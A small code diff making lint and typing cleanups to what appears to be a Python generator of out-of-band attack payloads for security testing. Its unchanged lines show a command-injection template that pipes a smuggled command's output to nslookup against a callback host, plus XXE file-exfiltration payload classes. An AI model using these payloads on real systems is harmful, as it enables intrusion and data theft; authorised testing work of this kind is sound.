@@ -23,9 +23,8 @@ different thread and never affects the response. This makes OAST not just
 
 from __future__ import annotations
 
-import base64
-import binascii
 from dataclasses import dataclass
+from typing import Any
 
 
 @dataclass
@@ -269,7 +268,7 @@ class OastPayloadGen:
             notes = f"Windows: exfil '{command}' output in DNS subdomain"
         else:
             payload = f";{command} | nslookup {host};"
-            notes = f"Generic: pipe command to nslookup"
+            notes = "Generic: pipe command to nslookup"
 
         return self._make("cmdi", payload, notes=notes)
 
@@ -469,7 +468,7 @@ class OastPayloadGen:
 
     def generate_for_class(self, attack_class: str, **kwargs) -> OastPayload | list[OastPayload]:
         """Generate payload(s) for a specific attack class."""
-        dispatch = {
+        dispatch: dict[str, Any] = {
             "xxe": lambda: self.xxe_oob(),
             "xxe_http": lambda: self.xxe_oob_http(),
             "xxe_exfil": lambda: self.xxe_oob_data_exfil(kwargs.get("file_path", "/etc/hostname")),
